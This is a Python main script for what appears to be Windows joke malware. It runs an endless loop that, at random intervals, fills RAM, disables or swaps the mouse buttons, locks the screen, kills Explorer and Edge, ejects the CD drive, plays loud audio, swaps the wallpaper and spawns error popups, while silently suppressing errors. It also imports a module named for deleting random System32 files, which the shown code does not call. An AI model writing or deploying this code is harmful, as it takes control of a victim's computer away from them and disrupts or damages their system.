from events.rotate_screen import *
from events.drive_eject import *
from events.error_popups import *
from events.lock import *
from events.minimize_window import *
from events.disable_click import *
from events.full_ram import *
from events.random_indian_meme import *
from events.delete_random_sys32 import *
from events.youtube_audio import *
from events.coronel import *
import webbrowser
import contextlib


def main():
    error_popups()
    n = 0
    while True:
        time.sleep(random.randint(300, 1000))
        with contextlib.suppress(Exception):
            event_manager(n)
        n += 1

        if n > 6:
            n = 0


def event_manager(index):
    match index:
        case 0:
            if random.randint(0, 1) == 0:
                ram_saturation()
            elif image_url := get_random_image_url():
                webbrowser.open(image_url)
                time.sleep(7)
                os.system('taskkill /f /im msedge.exe')
        case 1:
            if random.randint(0, 1) == 0:
                rotate_screen(180)
                time.sleep(10)
                rotate_screen(0)
            else:
                set_volume(100)
                play_audio(0)
        case 2:
            if random.randint(0, 1) == 0:
                disable_mouse(True)
                time.sleep(random.randint(30, 70))
                disable_mouse(False)
            else:
                for _ in range(4):
                    minimize_active_window()
                    time.sleep(10)
        case 3:
            if random.randint(0, 1) == 0:
                error_popups()
            else:
                lock()
        case 4:
            if random.randint(0, 1) == 0:
                cd_drive = find_cd_drive()
                if cd_drive is not None:
                    eject_drive(cd_drive)
                    play_audio(2)
                    time.sleep(2)
                    close_drive(cd_drive)
            else:
                set_volume(100)
                play_audio(1)
        case 5:
            if random.randint(0, 1) == 0:
                old_wallpaper = save_wallpaper()
                set_wallpaper(f'C:\\Program Files\\Startup Data\\coronel_wp.jpg')
                minimize_active_window()
                disable_mouse(True)
                set_volume(100)
                play_audio(3)
                disable_mouse(False)

                restore_wallpaper(old_wallpaper)
            else:
                os.system('taskkill /f /im explorer.exe')
                time.sleep(20)
                os.system('start explorer')
        case 6:
            if random.randint(0, 1) == 0:
                for _ in range(4):
                    time.sleep(5)
                    os.system('start msedge.exe')
            else:
                # Swap buttons
                ctypes.windll.user32.SwapMouseButton(True)
                time.sleep(20)
                ctypes.windll.user32.SwapMouseButton(False)


if __name__ == '__main__':
    main()
